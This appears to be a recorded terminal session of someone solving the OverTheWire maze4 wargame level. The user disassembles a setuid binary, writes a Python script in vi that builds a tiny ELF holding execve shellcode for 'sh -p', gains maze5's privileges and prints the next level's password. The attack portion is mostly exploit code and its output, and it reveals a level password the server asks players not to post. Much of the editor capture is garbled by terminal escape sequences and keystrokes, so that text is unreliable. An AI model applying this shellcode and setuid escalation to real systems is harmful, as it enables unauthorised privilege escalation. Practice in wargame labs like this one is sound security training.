@@ -1,0 +1,238 @@
+bash-5.2$ export PS1='client$ '
+
+client$ ssh -o StrictHostKeyChecking=accept-new -o ServerAliveInterval=15 -o ServerAliveCountMax=4 -o HostKeyAlgorithms=+ssh-rsa,ssh-dss -o KexAlgorithms=+diffie-hellman-group1-sha1,diffie-hellman-group14-sha1,diffie-hellman-group-exchange-sha1 maze4@maze.labs.overthewire.org -p 2225
+
+                                                    
+                            _ __ ___   __ _ _______ 
+                           | '_ ` _ \ / _` |_  / _ \
+                           | | | | | | (_| |/ /  __/
+                           |_| |_| |_|\__,_/___\___|
+                                                    
+
+                      This is an OverTheWire game server. 
+            More information on http://www.overthewire.org/wargames
+
+backend: gibson-0
+
+maze4@maze.labs.overthewire.org's password: 
+
+      ,----..            ,----,          .---.
+     /   /   \         ,/   .`|         /. ./|
+    /   .     :      ,`   .'  :     .--'.  ' ;
+   .   /   ;.  \   ;    ;     /    /__./ \ : |
+  .   ;   /  ` ; .'___,/    ,' .--'.  '   \' .
+  ;   |  ; \ ; | |    :     | /___/ \ |    ' '
+  |   :  | ; | ' ;    |.';  ; ;   \  \;      :
+  .   |  ' ' ' : `----'  |  |  \   ;  `      |
+  '   ;  \; /  |     '   :  ;   .   \    .\  ;
+   \   \  ',  /      |   |  '    \   \   ' \ |
+    ;   :    /       '   :  |     :   '  |--"
+     \   \ .'        ;   |.'       \   \ ;
+  www. `---` ver     '---' he       '---" ire.org
+
+
+Welcome to OverTheWire!
+
+If you find any problems, please report them to the #wargames channel on
+discord or IRC.
+
+--[ Playing the games ]--
+
+  This machine might hold several wargames.
+  If you are playing "somegame", then:
+
+    * USERNAMES are somegame0, somegame1, ...
+    * Most LEVELS are stored in /somegame/.
+    * PASSWORDS for each level are stored in /etc/somegame_pass/.
+
+  Write-access to homedirectories is disabled. It is advised to create a
+  working directory with a hard-to-guess name in /tmp/.  You can use the
+  command "mktemp -d" in order to generate a random and hard to guess
+  directory in /tmp/.  Read-access to both /tmp/ is disabled and to /proc
+  restricted so that users cannot snoop on eachother. Files and directories
+  with easily guessable or short names will be periodically deleted! The /tmp
+  directory is regularly wiped.
+  Please play nice:
+
+    * don't leave orphan processes running
+    * don't leave exploit-files laying around
+    * don't annoy other players
+    * don't post passwords or spoilers
+    * again, DONT POST SPOILERS!
+      This includes writeups of your solution on your blog or website!
+
+--[ Tips ]--
+
+  This machine has a 64bit processor and many security-features enabled
+  by default, although ASLR has been switched off.  The following
+  compiler flags might be interesting:
+
+    -m32                    compile for 32bit
+    -fno-stack-protector    disable ProPolice
+    -Wl,-z,norelro          disable relro
+
+  In addition, the execstack tool can be used to flag the stack as
+  executable on ELF binaries.
+
+  Finally, network-access is limited for most levels by a local
+  firewall.
+
+--[ Tools ]--
+
+ For your convenience we have installed a few useful tools which you can find
+ in the following locations:
+
+    * gef (https://github.com/hugsy/gef) in /opt/gef/
+    * pwndbg (https://github.com/pwndbg/pwndbg) in /opt/pwndbg/
+    * gdbinit (https://github.com/gdbinit/Gdbinit) in /opt/gdbinit/
+    * pwntools (https://github.com/Gallopsled/pwntools)
+    * radare2 (http://www.radare.org/)
+
+--[ More information ]--
+
+  For more information regarding individual wargames, visit
+  http://www.overthewire.org/wargames/
+
+  For support, questions or comments, contact us on discord or IRC.
+
+  Enjoy your stay!
+
+maze4@maze:~$ id
+
+uid=15004(maze4) gid=15004(maze4) groups=15004(maze4)
+maze4@maze:~$ ls -la /maze/maze4
+
+-r-sr-x--- 1 maze5 maze4 16392 Oct 25 13:39 /maze/maze4
+maze4@maze:~$ objdump -d -M intel /maze/maze4 --section=.text | grep -B3 -A2 "imul\|0f b6" | head -14
+
+ 80492f9:	e8 42 fd ff ff       	call   8049040 <read@plt>
+ 80492fe:	83 c4 0c             	add    esp,0xc
+ 8049301:	8b 8d 5c ff ff ff    	mov    ecx,DWORD PTR [ebp-0xa4]
+ 8049307:	0f b6 45 cf          	movzx  eax,BYTE PTR [ebp-0x31]
+ 804930b:	0f b6 d0             	movzx  edx,al
+ 804930e:	0f b6 45 d0          	movzx  eax,BYTE PTR [ebp-0x30]
+ 8049312:	0f b6 c0             	movzx  eax,al
+ 8049315:	0f af c2             	imul   eax,edx
+ 8049318:	39 c1                	cmp    ecx,eax
+ 804931a:	75 2b                	jne    8049347 <main+0x131>
+maze4@maze:~$ mkdir -p /run/screen/l4 && cd /run/screen/l4
+
+maze4@maze:/run/screen/l4$ cp /bin/sh ./sh
+
+maze4@maze:/run/screen/l4$ chmod 755 ./sh
+
+maze4@maze:/run/screen/l4$ vi tinel.py
+
+[>4;2m="tinel.py" 58L, 2758B▽  Pzz\[0%m           [>c# tinel.py - build a 123-byte i386 ELF that passes maze4's stat-then-exec gate.
+## maze4 gate (gdb-verified): read1(52)->bufA, lseek to dword(bufA+28), read2(32)->bufB#   pass iff dword(bufB+12) == bufA[7]*bufA[8] && st_size <= 123, then execv(argv[1])
+# An ELF passes for free:
+#   bufA[7],bufA[8] = EI_OSABI,EI_ABIVERSION = 0,0        -> product 0
+#   bufA+28..31     = e_phoff = 52                       -> the lseek offset
+#   bufB+12..15     = phdr0.p_paddr (phdr offset 12)     -> must be 0 (kernel ignores it)
+# Strings "sh\0-p\0" hide in e_ident[9..14] (EI_PAD); a dash copy sits in the cwd.
+# 26-byte stub at file offset 84: execve("sh", {"sh", "-p", NULL}, NULL) --
+# maze4 is setuid maze5, and dash -p keeps the elevated euid.
+import struct, sys
+V = 0x08048000
+CODE_OFF = 84
+code = bytes([
+    0x31, 0xC0,# xor eax, eax
+    0x50,# push eax            (NULL)
+    0x68, 0x0C, 0x80, 0x04, 0x08,# push 0x0804800c     ("-p" @ V+12)
+    0x68, 0x09, 0x80, 0x04, 0x08,# push 0x08048009     ("sh" @ V+9)
+    0x89, 0xE1,# mov ecx, esp        (argv)
+    0xBB, 0x09, 0x80, 0x04, 0x08,# mov ebx, 0x08048009 ("sh" path)
+    0x31, 0xD2,# xor edx, edx        (envp NULL)
+    0xB0, 0x0B,# mov al, 11          (__NR_execve)
+    0xCD, 0x80,# int 0x80
+])
+assert len(code) == 26
+ehdr = bytearray(52)
+ehdr[0:8] = b"\x7fELF\x01\x01\x01\x00"
+ehdr[9:15] = b"sh\x00-p\x00"
+ehdr[15] = 0
+struct.pack_into("<HHIIIIIHHHHHH", ehdr, 16,2,# e_type = ET_EXEC3,# e_machine = EM_3861,1Top^[  ^[  :set noai nocin nosi indentexpr= formatoptions=
+1,1TopdG  ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   --No lines in buffer--0,0-1Alli -- INSERT --0,1All#1,2 3t4i5n6e7l8.9p10y1 2-3 4b5u6i7l8d9 20a1 2132435-6b7y8t9e30 1i2338465 6E7L8F9 40t1h2a3t4 5p6a7s8s9e50s1 2ma4z5e647'8s9 60s1t2a3t4-5t6h7e8n9-70e1x2e3c4 5g6a7t8e9.802,1 #23,1#2 3m4a5z6e748 9g10a1t2e3 4(5g6d7b8-9v20e1r2i3f4i5e6d7)()8:()9 30r1e2a3d4(55627)()8-(52)9>40b1u2f3A4,5 6l7s8e9e50k1 2t3o4 5d6w7o8r9d60(1b2u3f4A5+62788)()9,()70 1r2e3a4d5(63728)()9-(32)80>1b2u3f4B5,64,1 #2 3 4 5p6a7s8s9 10i1f2f3 4d5w6o7r8d9(20b1u2f3B4+51627)()8 ()9=30=1 2b3u4f5A6[778][]9*[7]40b1u2f3A4[586][]7 [8]8&9&50 1s2t3_4s5i6z7e8 9<60=1 2132435,6 7t8h9e70n1 2e3x4e5c6v7(8a9r80g1v2[314][]5)([1])6.()75,1 #2 3A4n5 6E7L8F9 10p1a2s3s4e5s6 7f8o9r20 1f2r3e4e5:66,1 #2 3 4 5b6u7f8A9[1071][]2,[7]3b4u5f6A7[889][]20 [8]1=2 3E4I5_6O7S8A9B30I1,2E3I4_5A6B7I8V9E40R1S2I3O4N5 6=7 809,50017,1 #2 3 4 5 6 7-8>9 10p1r2o3d4u5c6t7 8098,1 #2 3 4 5b6u7f8A9+102182.3.43516 7 8 9 20=1 2e3_4p5h6o7f8f9 30=1 253249,1 #2 3 4 5 6 7-8>9 10t1h2e3 4l5s6e7e8k9 20o1f2f3s4e5t610,1#2 3 4 5b6u7f8B9+101122.3.41556 7 8 9 20=1 2p3h4d5r6.7p8_9p30a1d2d3r4 5(6p7h8d9r40 1o2f3f4s5e6t7 819250)()1()1,1 #2 3 4 5 6 7-8>9 10m1u2s3t4 5b6e7 809 20(1k2e3r4n5e6l7 8i9g30n1o2r3e4s5 6i7t8)()9()2,1 #2 3S4t5r6i7n8g9s10 1"2s3h4\506-7p8\9020"1 2h3i4d5e6 7i8n9 30e1_2i3d4e5n6t7[899.40.11243][]4 [9..14]5(6E7I8_9P50A1D2)()3;(EI_PAD)4 5a6 7d8a9s60h1 2c3o4p5y6 7s8i9t70s1 2i3n4 5t6h7e8 9c80w1d2.33,1 #2 32465-6b7y8t9e10 1s2t3u4b5 6a7t8 9f20i1l2e3 4o5f6f7s8e9t30 18243:4 5e6x7e8c9v40e1(2"3s4h5"6,7{8"9s50h1"2,3"4-5p6"7,8N9U60L1L2}{}3,{}4N5U6L7L8)()9 ()70-1-24,1 #2 3m4a5z6e748 9i10s1 2s3e4t5u6i7d8 9m20a1z2e354,5 6a7n8d9 30d1a2s3h4 5-6p7 8k9e40e1p2s3 4t5h6e7 8e9l50e1v2a3t4e5d6 7e8u9i60d1.25,1 i2m3p4o5r6
+import78s9t10str1stru2c3t4,56s7y8s96,1 V23=45060x70x088901041820304057,1 C2O3D4E5_6O7F8F910=1283448,1 c2o3d4e56=78b9y10t1e2bytes3(4[5060x70x3819,201020x30xC405,678930123456789#40 1x2o3r4 5e6a7x8,9 50e1a2x39,1 2345060x70x5809,10123456789201234567893012345678940#1 2p3u4s5h6 7e8a9x50 1 2(3e4n5v6p7 8N9U60L1L2)()3()20,1 2345060x70x6889,101020x30x04C5,67080x90x82001,23040x50x0647,890300x10x0283,456789#40 1p2u3s4h5 6"7-8p9"50 1@2 3V4+516271,1 2345060x70x6889,101020x30x0495,67080x90x82001,23040x50x0647,890300x10x0283,456789#40 1p2ush "7s8h"50 1@2 3V4+5962,1 2345060x70x8899,101020x30xE415,6789201234567893012345678940#1 2m3o4v5 6e7c8x9,50 1e2s3p4 5 6(7a8r9g60v1)()2(argv)3,1 2345060x70xB8B9,101020x30x0495,67080x90x82001,23040x50x0647,890300x10x0283,456789#40 1m2o3v4 5e6b7x8,9 50"1s2h3"4 5p6a7t8h94,1 2345060x70x3819,101020x30xD425,67892012345678930123456840#1 2x3o4r5 6e7d8x9,50 1e2d3x4 5 6(7e8n9v60p1 2N3U4L5L6)()7()5,1 2345060x70xB809,101020x30x04B5,6789201234567893012345678940#1 2m3o4v5 6a7l8,9 501112 3 4 5 6(7_8_9N60R1_2e3x4e5c6v7e8)()9()6,1 2345060x70xC8D9,101020x30x8405,6789201234567893012345678940#1 2i3n4t5 607x8890507,1 ][]2)([])3()8,1a2as3
+ass4e5r6
+assert78l9e10len1(2c3o4d5e6)(code)7(code)8=9=2012263
+~                                                                                                   29,1Bote2h3d4r56=78b9y10t1e2a3r4r5a6bytearray7(859220)()1
+~                                                                                                   30,1Bot()
+e2h3d4r5[607:889][]10[]1=23b4b"5\6\x778\x7f9E20L1F2\3\x405\x016\7\x809\x0130\x203\x014\5\x607\x008"9
+~                                                                                                   31,1Bote2hd4r5[697:819510]
+ehdr[]1
+ehdr[]2=34b5b"6s7h8\9\x2001\x002-3p4\5\x607\x008"9
+~                                                                                                   32,1Bote2h3d4r5[61758][]9[]10=1203
+~                                                                                                   33,1Bots2t3
+str4
+stru5c6t7.8p9a10c1k2_3i4n5t6o7(8"9<20H1H2I3I4I5I6I7H8H9H30H1H2H3"4,56e7h8d9r40,121364,5
+~                                                                                                   34,1Bot234526,78910123456789#20 1e2_3t4y5p6e7 8=9 30E1T2_3E4X5E6C7
+~                                                                                                   35,1Bot234536,78910123456789#20 1e2_3m4a5c6h7i8n9e30 1=2 3E4M5_6378869
+~                                                                                                   36,1Bot234516,78910123456789#20 1e2_3v4e5r6s7i8o9n30
+~                                                                                                   37,1Bot2345V67+89C10O1D2E3_4O5F6F7,89#20 1e2_3e4n5t6r7y8
+~                                                                                                   38,1Bot23455627,8910123456789#20 1e2_3p4h5o6f7f8 9(30a1l2s3o4 5t6h7e8 9g40a1t2e3'4s l7s8e9e50k1 2o3f4f5s6e7t8)()9
+~                                                                                                   39,1Bot()
+234506,78910123456789#20 1e2_3s4h5o6f7f8
+~                                                                                                   40,1Bot234506,78910123456789#20 1e2_3f4l5a6g7s8
+~                                                                                                   41,1Bot23455627,8910123456789#20 1e2_3e4h5s6i7z8e9
+~                                                                                                   42,1Bot23453627,8910123456789#20 1e2_3p4h5e6n7t8s9i30z1e2
+~                                                                                                   43,1Bot234516,7891023456789#20 1e2_3p4h5n6u7m8
+~                                                                                                   44,1Bot234506,78910123456789#20 1e2_3s4h5e6n7t8s9i30z1e2
+~                                                                                                   45,1Bot234506,78910123456789#20 1e2_3s4h5n6u7m8
+~                                                                                                   46,1Bot234506)()7()8910123456789#20 1e2_3s4h5s6t7r8n9d30x1
+~                                                                                                   47,1Botp2h3d4r56=78b9y10t1e2a3r4r5a6bytearray7(839220)()1
+~                                                                                                   48,1Bot()
+s2t3
+str4
+stru5c6t7.8p9a10c1k2_3i4n5t6o7(8"9<20I1I2I3I4I5I6I7I8"9,301p2h3d4r5,6708,9
+~                                                                                                   49,1Bot234516,78910123456789#20 1p2_3t4y5p6e7 8=9 30P1T2_3L4O5A6D7
+~                                                                                                   50,1Bot234506,78910123456789#20 1p2_3o4f5f6s7e8t9
+~                                                                                                   51,1Bot2345V6,78910123456789#20 1p2_3v4a5d6d7r8
+~                                                                                                   52,1Bot234506,78910123456789#20 1p2_3p4a5d6d7r8 9(30t1h2e3 4g5a6t7e8'9s40 1c2o3m4p5a6r7e8 9d50w1o2r3d4:5 mu8s9t60 1b2e3 405)()6
+~                                                                                                   53,1Bot()
+2345162738,910123456789#20 1p2_3f4i5l6esz9
+~                                                                                                   54,1Bot2345162738,910123456789#20 1p2_3m4e5m6s7z8
+~                                                                                                   55,1Bot234556,78910123456789#20 1p2_3f4l5a6g7s8 9=30 1R2|3X4
+~                                                                                                   56,1Bot2345060x70x180901001)()2()3456789#20 1p2_3a4l5i6g7n8
+~                                                                                                   57,1Botd2a3t4a56=78b9y10t1e2bytes3(4e5h6d7r8)(ehdr)9(ehdr)20+12b3y4t5e6bytes7(8p9h30d1r2)(phdr)3(phdr)4+56c7o8d9e40
+~                                                                                                   58,1Botd2a3t4a56+7=89b10b"1\2\x304\x005"67*89(201122334-56l7e8len9(30d1a2t3a4)(data)5)((data))6()78#9 40p1a2d3 4t5o6 7e8x9a50c1t2l3y4 5162738 9(60s1i2z3e4 5g6a7t8e9:70 1<2=3 405x677b8)()9
+~                                                                                                   59,1Bot()
+a2as3
+ass4e5r6
+assert78l9e10len1(2d3a4t5a6)(data)7(data)8=9=201122334
+~                                                                                                   60,1Boto2p3e4
+open5(s7y8s9.10a1r2g3v4[516][]7,[]89"20w1b2"3)()4.()5w6r7i8t9e30(1d2a3t4a5)(data)6
+~                                                                                                   61,1Bot(data)
+p2r3i4n5
+print6(7"8w9r10o1t2e3"4,56l7e8len9(d21ata4)(data)5,(data)67"8b9y30t1e2s3"4)()5
+~                                                                                                   62,1Bot()
+^[  62,0-1Bot:wq
+[>4;m"tinel.py" 62L, 2458B written
+>[>4;mmaze4@maze:/run/screen/l4$ python3 tinel.py tiny
+
+wrote 123 bytes
+maze4@maze:/run/screen/l4$ chmod 755 tiny
+
+maze4@maze:/run/screen/l4$ xxd tiny | head -6
+
+00000000: 7f45 4c46 0101 0100 0073 6800 2d70 0000  .ELF.....sh.-p..
+00000010: 0200 0300 0100 0000 5480 0408 3400 0000  ........T...4...
+00000020: 0000 0000 0000 0000 3400 2000 0100 0000  ........4. .....
+00000030: 0000 0000 0100 0000 0000 0000 0080 0408  ................
+00000040: 0000 0000 7b00 0000 7b00 0000 0500 0000  ....{...{.......
+00000050: 0010 0000 31c0 5068 0c80 0408 6809 8004  ....1.Ph....h...
+maze4@maze:/run/screen/l4$ /maze/maze4 tiny
+
+valid file, executing
+$ id
+uid=15004(maze4) gid=15004(maze4) euid=15005(maze5) groups=15004(maze4)
+$ cat /etc/maze_pass/maze5
+A3846ZPJuH
+$ exit
+maze4@maze:/run/screen/l4$ exit
+
+logout
+Connection to maze.labs.overthewire.org closed.
+client$ exit
+
+exit
